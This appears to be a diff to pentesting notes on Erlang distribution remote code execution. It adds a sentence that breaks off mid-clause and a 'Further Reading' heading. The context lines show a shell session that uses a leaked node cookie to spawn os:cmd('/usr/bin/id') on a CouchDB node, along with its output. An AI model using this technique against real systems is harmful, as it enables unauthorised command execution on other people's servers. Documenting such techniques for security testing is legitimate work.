@@ -2,6 +2,8 @@
 
 ## Authentication Cookie RCE
 
+If the authentication cookie for an erlang node is leaked, then you can 
+
 ```
 otheruser@booj:/$ export HOME=/tmp
 export HOME=/tmp
@@ -16,6 +18,8 @@ spawn(couchdb@localhost, fun() -> io:format("~p~n", [os:cmd('/usr/bin/id')]) end
 "uid=1000(mainuser) gid=1000(mainuser) groups=1000(mainuser)\n"
 <6881.23434.8>
 ```
+
+### Further Reading
 
 [https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)
 
